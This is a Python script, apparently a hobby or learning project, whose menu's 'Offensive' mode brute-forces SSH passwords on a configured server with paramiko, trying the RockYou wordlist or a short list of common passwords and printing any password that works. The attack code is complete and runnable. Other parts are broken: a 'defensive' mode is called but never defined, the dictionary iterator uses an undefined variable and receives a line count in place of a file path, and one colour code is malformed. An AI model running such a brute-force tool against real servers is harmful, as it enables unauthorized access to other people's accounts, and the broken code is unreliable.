#!/usr/bin/env python3

# Rodolfo Gonzalez
# January 30 2024


import time
import os
import paramiko

# Set the path to the RockYou.txt file
ROCKYOU_PATH = os.path.expanduser("~/Documents/rockyou.txt")

# Set the SSH server information
SSH_IP = "your_ssh_server_ip"  # Replace with the actual IP address of the SSH server
SSH_USERNAME = "your_ssh_username"  # Replace with the actual SSH username

##################### === Function for Offensive Mode ===###################
def offensive_mode(wordlist_path):
    try:
        # Open the wordlist file in binary mode and read all lines
        with open(wordlist_path, 'rb') as wordlist_file:
            words = [line.strip() for line in wordlist_file.readlines()]

        # Initialize SSH client
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Iterate through and try each word as the password
        for word in words:
            password = word.decode('utf-8', errors='ignore')
            print(f"Attempting password: {password}")

            try:
                # Connect to the SSH server
                ssh_client.connect(SSH_IP, username=SSH_USERNAME, password=password)

                # If successful, print a message and break the loop
                print(f"Password found: {password}")
                break

            except paramiko.AuthenticationException:
                # Password authentication failed, continue with the next password
                pass

        # Close the SSH client
        ssh_client.close()

    except FileNotFoundError:
        print("Word list file not found.")
    except KeyboardInterrupt:
        print("Operation aborted by the user.")

##################### === Function for Small Wordlist (Option 2) ===###################
def small_wordlist_mode():
    # Define your small wordlist directly in the code
    small_wordlist = [
        "password1",
        "123456",
        "qwerty",
        # Add more passwords as needed
    ]

    try:
        # Initialize SSH client
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Iterate through and try each word as the password
        for password in small_wordlist:
            print(f"Attempting password: {password}")

            try:
                # Connect to the SSH server
                ssh_client.connect(SSH_IP, username=SSH_USERNAME, password=password)

                # If successful, print a message and break the loop
                print(f"Password found: {password}")
                break

            except paramiko.AuthenticationException:
                # Password authentication failed, continue with the next password
                pass

        # Close the SSH client
        ssh_client.close()

    except KeyboardInterrupt:
        print("Operation aborted by the user.")

##################### === Function for Dictionary Iterator (Option 3) ===###################
def dictionary_iterator_mode(wordlist_path):
    try:
        # Open the wordlist file in binary mode and read specified number of lines
        with open(wordlist_path, 'rb') as wordlist_file:
            words = [next(wordlist_file).strip() for _ in range(lines_to_read)]

        # Iterate through and print words with a delay
        for word in words:
            print("Current word:", word.decode('utf-8', errors='ignore'))
            time.sleep(1)

    except FileNotFoundError:
        print("Word list file not found.")
    except ValueError:
        print("Invalid input for the number of lines. Please enter a valid integer.")
    except KeyboardInterrupt:
        print("Operation aborted by the user.")

##################### === Main program ===###################
if __name__ == "__main__":
    try:
        while True:
            print("\033[35mSelect a mode:\033[0m]")
            print("1. Offensive; Brute Force SSH")
            print("2. Defensive; Password Recognized")
            print("3. Dictionary Iterator")
            print("4. Exit")

            mode = input("\033[35mEnter mode (1, 2, 3, or 4 to exit): \033[0m")

            if mode == "1":
                wordlist_choice = input("Choose a wordlist:\n1. RockYou.txt\n2. Small wordlist (provided in code)\nEnter your choice (1 or 2): ")
                if wordlist_choice == "1":
                    wordlist_path = os.path.expanduser("~/Documents/rockyou.txt")
                    # Run Offensive Mode with selected wordlist
                    offensive_mode(wordlist_path)
                elif wordlist_choice == "2":
                    # Run Small Wordlist Mode
                    small_wordlist_mode()
                else:
                    print("Invalid choice. Exiting.")
                    break
            elif mode == "2":
                # Run Defensive Mode
                defensive_mode()
            elif mode == "3":
                wordlist_choice = input("Enter the number of lines to process: ")
                # Run Dictionary Iterator Mode with specified number of lines
                dictionary_iterator_mode(wordlist_choice)
            elif mode == "4":
                print("\033[340mExiting the program. Goodbye!\033[0m")
                break  # Exit the loop and end the program
            else:
                print("Invalid choice. Please select 1, 2, 3, or 4.")

    except KeyboardInterrupt:
        print("Operation aborted by the user.")

